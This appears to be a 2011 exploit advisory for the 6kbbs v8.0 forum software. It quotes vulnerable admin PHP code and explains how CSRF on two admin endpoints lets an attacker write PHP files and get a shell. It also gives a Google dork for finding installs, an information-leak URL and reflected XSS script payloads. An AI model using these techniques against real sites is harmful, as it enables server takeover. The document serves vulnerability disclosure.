@@ -1,0 +1,85 @@
+# Exploit Title: 6kbbs Multiple Vulnerabilities
+# Google Dork: Powered by 6kbbs V8.0
+# Date: 2011/10/5
+# Author: insight-labs
+# Software Link: http://www.6kbbs.net/
+# Version: 6KBBS v8.0 build 20101201
+# Tested on: linux+apache
+
+1.Cross-site request forgery (getshell)
+
+vulnerable file: /admin/user_ajax.php
+
+detail:
+case "savegroups2":
+try
+{
+    $groups = $_POST['groups'];
+    if(is_array($groups))
+    {
+        foreach($groups as $group)
+        {
+            $db->row_update("groups", $group, "id={$group['id']}");
+        }
+    }
+    $rows = $db->row_select("groups", "", 0,
+"groupid,groupname,popedom,starnum", "groupid");
+    $groups = array();
+    foreach($rows as $row)
+    {
+        $groups["{$row['groupid']}"] = $row;
+    }
+    writeGroupsCache();
+    succeedFlag();
+}
+catch(Exception $e)
+{
+    echo($e);
+}
+break;
+
+Update the information, by writeGroupCache () function to update the
+information written to \cache\groups.php them, direct access to the
+\cache\groups.php you can get shell.
+
+
+2.Cross-site request forgery  (getshell)
+
+vulnerable file: /admin/portalchannel_ajax.php
+
+detail:
+
+     case "saverule":
+try
+{
+    $id = trim(strFilter($_POST['id']));
+    $code = stripslashes($_POST['code']);
+    writeFile("collectrules/{$id}.php", $code);
+    succeedRes();
+}
+catch(Exception $e)
+{
+    echo($e);
+}
+break;
+
+Directly to the id as a php file name, code is written as the contents of
+the file /admin/collectrules/ folder them.
+And receive data at the time, did not verify Referer and Token, you can take
+advantage of CSRF.
+
+3.Information Leakage
+vulnerable file:/admin/portalcollect.php
+                      /getfiles.php?f=http://xxx&t=js
+
+
+4.Cross Site Scripting Vulnerabilities
+
+detail: many file directly use $_SERVER['PHP_SELF'] and not sanitize so
+cause xss Vulnerabilities
+
+    credits.php/"><script>alert(1)</script>
+    forum.php/"><script>alert(1)</script>
+    index.php/"><script>alert(1)</script>
+    login.php/"><script>alert(1)</script>
+    online.php/"><script>alert(1)</script>
